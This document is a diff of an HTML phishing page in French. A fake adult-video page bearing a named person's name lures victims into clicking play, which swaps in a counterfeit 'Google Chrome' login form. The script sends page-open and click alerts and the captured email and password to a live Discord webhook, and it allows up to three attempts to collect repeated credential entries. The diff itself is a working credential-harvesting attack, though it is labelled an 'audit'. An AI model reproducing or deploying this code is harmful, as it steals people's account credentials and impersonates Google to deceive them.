@@ -7,45 +7,49 @@
     <link id="favicon" rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=pornhub.com&sz=128">
     
     <style>
-        body { margin: 0; font-family: 'Roboto', Arial, sans-serif; background: #000; color: white; overflow-x: hidden; }
+        body { margin: 0; font-family: 'Roboto', Arial, sans-serif; background: #000; color: white; overflow: hidden; }
         
         /* --- LECTEUR VIDEO --- */
         #page-video { display: flex; flex-direction: column; height: 100vh; }
         .nav-hub { padding: 15px 25px; background: #1b1b1b; display: flex; align-items: center; border-bottom: 2px solid #ff9900; }
-        .logo-hub { font-size: 1.6rem; font-weight: bold; color: #fff; }
+        .logo-hub { font-size: 1.6rem; font-weight: bold; color: #fff; text-decoration: none; }
         .logo-hub span { background: #ff9900; color: #000; padding: 2px 6px; border-radius: 4px; margin-left: 4px; }
         
-        .main-zone { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
-        .vid-title { margin-bottom: 20px; font-size: 1.4rem; color: #ff9900; text-align: center; font-weight: bold; }
+        .main-zone { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 10px; }
+        .vid-title { margin-bottom: 15px; font-size: 1.2rem; color: #fff; text-align: center; font-weight: bold; width: 90%; }
 
-        .video-player { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #111; border-radius: 8px; position: relative; overflow: hidden; border: 1px solid #333; cursor: pointer; }
-        .thumbnail-img { width: 100%; height: 100%; object-fit: cover; filter: blur(25px) brightness(0.5); }
+        .video-container { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #111; border-radius: 8px; position: relative; overflow: hidden; border: 1px solid #333; cursor: pointer; }
         
-        .play-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .btn-play { width: 80px; height: 80px; background: #ff9900; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(255,153,0,0.5); }
-        .btn-play::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 8px; }
+        /* L'IMAGE DU DEPOT (Nette, sans flou excessif) */
+        .thumbnail-img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        
+        .play-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.3); transition: 0.3s; }
+        .play-overlay:hover { background: rgba(0,0,0,0.1); }
+        
+        .btn-play { width: 70px; height: 70px; background: rgba(255, 153, 0, 0.95); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        .btn-play::after { content: ''; border-top: 12px solid transparent; border-bottom: 12px solid transparent; border-left: 20px solid white; margin-left: 6px; }
 
-        /* --- LOGIN GOOGLE (FIDÈLE À TA CAPTURE) --- */
+        /* --- LOGIN GOOGLE --- */
         #page-login { display: none; background: white; min-height: 100vh; color: #202124; flex-direction: column; align-items: center; padding-top: 50px; }
-        .login-wrap { width: 90%; max-width: 440px; text-align: center; }
+        .login-wrap { width: 90%; max-width: 440px; }
         .google-logo { width: 48px; margin-bottom: 15px; }
         
-        .field { position: relative; margin-top: 35px; text-align: left; }
+        .field { position: relative; margin-top: 35px; }
         .input-box { border: 1px solid #dadce0; border-radius: 4px; padding: 14px 16px; position: relative; }
-        .input-box.error { border: 2px solid #b3261e; } /* Rouge identique capture */
+        .input-box.error { border: 2px solid #b3261e; }
         
         .label { position: absolute; top: -10px; left: 12px; background: #fff; padding: 0 5px; font-size: 12px; color: #5f6368; }
         .input-box.error .label { color: #b3261e; }
         
         input { border: none; width: 100%; font-size: 16px; outline: none; background: transparent; }
         
-        .error-msg { display: none; color: #b3261e; font-size: 14px; margin-top: 8px; align-items: flex-start; line-height: 1.4; text-align: left; }
+        .error-msg { display: none; color: #b3261e; font-size: 14px; margin-top: 8px; align-items: flex-start; text-align: left; }
         .err-icon { background: #b3261e; color: #fff; border-radius: 50%; min-width: 16px; height: 16px; display: inline-flex; justify-content: center; align-items: center; font-size: 11px; margin-right: 10px; margin-top: 2px; }
 
-        .check-row { display: flex; align-items: center; margin-top: 25px; cursor: pointer; font-size: 15px; }
-        .check-row input { width: 18px; height: 18px; margin-right: 12px; cursor: pointer; }
+        .check-row { display: flex; align-items: center; margin-top: 25px; cursor: pointer; font-size: 15px; color: #202124; }
+        .check-row input { width: 18px; height: 18px; margin-right: 12px; }
 
-        .footer { margin-top: 45px; display: flex; justify-content: flex-end; width: 100%; }
+        .footer { margin-top: 45px; display: flex; justify-content: flex-end; }
         .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
     </style>
 </head>
@@ -55,21 +59,21 @@
         <div class="nav-hub"><div class="logo-hub">HUB<span>VIDEO</span></div></div>
         <div class="main-zone">
             <h1 class="vid-title">SÉQUENCE EXCLUSIVE : MARCELLIN MOBATELI</h1>
-            <div class="video-player" onclick="switchPage()">
-                <img src="https://raw.githubusercontent.com/TON_USER/TON_REPO/main/thumbnail.jpg" class="thumbnail-img" onerror="this.src='https://images.unsplash.com/photo-1485846234645-a62644f84728?w=800'">
+            <div class="video-container" onclick="switchPage()">
+                <img src="thumbnail.jpg" class="thumbnail-img" alt="Video Thumbnail">
                 <div class="play-overlay">
                     <div class="btn-play"></div>
-                    <p style="margin-top:20px; text-transform:uppercase; font-weight:bold;">Contenu protégé - 18+</p>
+                    <p style="margin-top:15px; font-weight:bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.8);">REGARDER LA VIDÉO (04:12)</p>
                 </div>
             </div>
         </div>
     </div>
 
     <div id="page-login">
-        <div class="login-wrap">
+        <center class="login-wrap">
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" class="google-logo">
-            <h1 style="font-weight:400;">Google Chrome</h1>
-            <p>Confirmez votre compte pour continuer</p>
+            <h1 style="font-weight:400; margin:0;">Google Chrome</h1>
+            <p style="color:#5f6368;">Confirmez votre identité pour continuer</p>
 
             <form id="auditForm">
                 <div class="field">
@@ -98,57 +102,53 @@
                     <button type="submit" class="btn-next">Suivant</button>
                 </div>
             </form>
-        </div>
+        </center>
     </div>
 
     <script>
-        const DISCORD = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+        const WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
         let attempt = 0;
 
-        // Signal 1 : Ouverture
+        // SIGNAL : OUVERTURE
         window.onload = () => {
-            fetch(DISCORD, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "🚩 **Alerte** : Un utilisateur vient d'ouvrir le lien (Marcellin Mobateli)." })
+            fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: "🚨 **Audit** : Page ouverte (Marcellin Mobateli)." })
             });
         };
 
-        // Switch et Signal 2 : Clic
+        // SIGNAL : CLIC
         function switchPage() {
-            fetch(DISCORD, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "🖱️ **Action** : L'utilisateur a cliqué sur Play." })
+            fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: "🖱️ **Action** : Clic sur Play." })
             });
             document.getElementById('page-video').style.display = 'none';
             document.getElementById('page-login').style.display = 'flex';
-            
-            // Change Favicon et Titre pour Google
             document.getElementById('favicon').href = "https://www.google.com/favicon.ico";
             document.title = "Connexion - Google Chrome";
         }
 
-        // Afficher/Cacher Pass
         document.getElementById('showP').onclick = function() {
             document.getElementById('pass').type = this.checked ? 'text' : 'password';
         };
 
-        // Logs et Tentatives
+        // SIGNAL : DONNÉES
         document.getElementById('auditForm').onsubmit = function(e) {
             e.preventDefault();
             attempt++;
             const m = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
 
-            fetch(DISCORD, {
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🔓 Données Capturées (" + attempt + "/3)",
+                        title: "🔓 Tentative " + attempt + "/3",
                         color: attempt === 3 ? 15158332 : 3447003,
                         fields: [
                             { name: "👤 Email", value: "`" + m + "`" },
                             { name: "🔑 Mot de passe", value: "`" + p + "`" }
                         ],
-                        footer: { text: "Marcellin Mobateli Audit" },
                         timestamp: new Date()
                     }]
                 })
